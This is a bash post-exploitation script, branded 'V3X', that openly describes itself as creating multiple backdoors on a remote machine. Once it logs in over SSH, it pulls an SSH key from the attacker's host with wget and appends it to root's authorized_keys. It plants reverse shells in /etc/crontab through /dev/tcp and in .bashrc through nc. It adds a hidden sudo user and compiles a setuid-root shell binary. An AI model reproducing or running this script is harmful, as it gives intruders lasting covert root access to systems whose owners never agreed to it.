#!/bin/bash



echo -e "\e[31mVVVVVVVV           VVVVVVVV 333333333333333   XXXXXXX       XXXXXXX      \e[0m"
echo -e "\e[31mV::::::V           V::::::V3:::::::::::::::33 X:::::X       X:::::X      \e[0m"
echo -e "\e[31mV::::::V           V::::::V3::::::33333::::::3X:::::X       X:::::X      \e[0m"
echo -e "\e[31mV::::::V           V::::::V3333333     3:::::3X::::::X     X::::::X      \e[0m"
echo -e "\e[31m V:::::V           V:::::V             3:::::3XXX:::::X   X:::::XXX      \e[0m"
echo -e "\e[31m  V:::::V         V:::::V              3:::::3   X:::::X X:::::X         \e[0m"
echo -e "\e[31m   V:::::V       V:::::V       33333333:::::3     X:::::X:::::X          \e[0m"
echo -e "\e[31m    V:::::V     V:::::V        3:::::::::::3       X:::::::::X           \e[0m"
echo -e "\e[31m     V:::::V   V:::::V         33333333:::::3      X:::::::::X         github:https://github.com/V3X-777     \e[0m"
echo -e "\e[31m      V:::::V V:::::V                  3:::::3    X:::::X:::::X          discord:s3cdet17\e[0m"
echo -e "\e[31m       V:::::V:::::V                   3:::::3   X:::::X X:::::X         \e[0m"
echo -e "\e[31m        V:::::::::V                    3:::::3XXX:::::X   X:::::XXX      \e[0m"
echo -e "\e[31m         V:::::::V         3333333     3:::::3X::::::X     X::::::X      \e[0m"
echo -e "\e[31m          V:::::V          3::::::33333::::::3X:::::X       X:::::X      \e[0m"
echo -e "\e[31m           V:::V           3:::::::::::::::33 X:::::X       X:::::X      \e[0m"
echo -e "\e[31m            VVV             333333333333333   XXXXXXX       XXXXXXX      \e[0m"


echo -e "\e[31mBackdoor Setup Script\e[0m"
echo -e "\e[31m---------------------\e[0m"
echo -e "\e[31mThis script is created by V3X to create multi-backdoors on a remote machine.\e[0m"
echo -e "\e[31mPlease provide the following information:\e[0m"


read -p "Enter the machine username: " user
read -p "Enter the machine IP address: " IP
read -p "Entre your password: " PASS
read -p "Entre your username: " USER
read -p "Entre your ip: " ipuser
read -p "Entre your port: " port
read -p "Entre the name of the ssh public key file: " PUBLIC_KEY


vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no "$user"@"$IP" << EOF

sleep 3

wget http://$vpn/"$PUBLIC_KEY" -O "/tmp/"$PUBLIC_KEY""

sleep 3
cat "/tmp/"$PUBLIC_KEY"" >> "root/.ssh/authorized_keys"

echo "* * * * * root /bin/sh -c \"/bin/bash -i >& /dev/tcp/"$ipuser"/"$port" 0>&1\"" | sudo tee -a /etc/crontab

echo 'nc -e /bin/bash "$ipuser" "$port" 2>/dev/null &' >> ~/.bashrc

sudo adduser --disabled-password --gecos "" "$USER"

echo ""$USER":"$PASS"" | sudo chpasswd

sudo usermod -aG sudo "$USER"

echo ""$USER" ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers

touch vshell.c
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > vshell.c
gcc -o vshell vshell.c
rm vshell.c
chown root:root vshell
chmod u+s vshell
sudo mv vshell /usr/bin/

echo -e "\e[32m--------------------------------------------THANK-YOU-FOR-USING-V3X-SCRIPT-----------------------------------------------\e[0m"
